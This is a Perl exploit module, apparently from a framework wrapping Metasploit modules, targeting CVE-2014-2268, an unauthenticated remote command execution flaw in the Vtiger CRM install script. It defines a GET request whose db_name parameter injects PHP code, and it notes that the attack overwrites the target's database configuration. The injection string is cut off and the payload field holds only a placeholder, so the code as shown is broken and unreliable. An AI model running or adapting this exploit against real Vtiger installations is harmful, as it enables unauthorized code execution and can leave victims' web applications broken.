package MSFExploits::Exploits::VTIGER::MSF::VtigerInstallRce;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::VTIGER);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "VtigerInstallRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2014-2268",
  DESCRIPTION => "

        This module exploits an arbitrary command execution vulnerability in the

        Vtiger install script. This module is set to ManualRanking due to this

        module overwriting the target database configuration, which may result in

        a broken web app, and you may not be able to get a session again.

      ",
  METHOD => "GET",
  MSF_MODULE => "vtiger_install_rce",
  PATH => "module=Install&view=Index&mode=Step5&db_name=127.0.0.1;if(isset(\$_GET[#{rand_arg&",
  PATHS => ["index.php", ""],
  PAYLOAD => "?",
  REFERENCES => [
    "https://www.navixia.com/blog/entry/navixia-find-critical-vulnerabilities-in-vtiger-crm-cve-2014-2268-cve-2014-2269.html",
    "http://vtiger-crm.2324883.n4.nabble.com/Vtigercrm-developers-IMP-forgot-password-and-re-installation-security-fix-tt9786.html",
  ],
  TITLE => "Vtiger Install Unauthenticated Remote Command Execution",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to Vtiger", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'X-Requested-With' => 'fMLZL',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
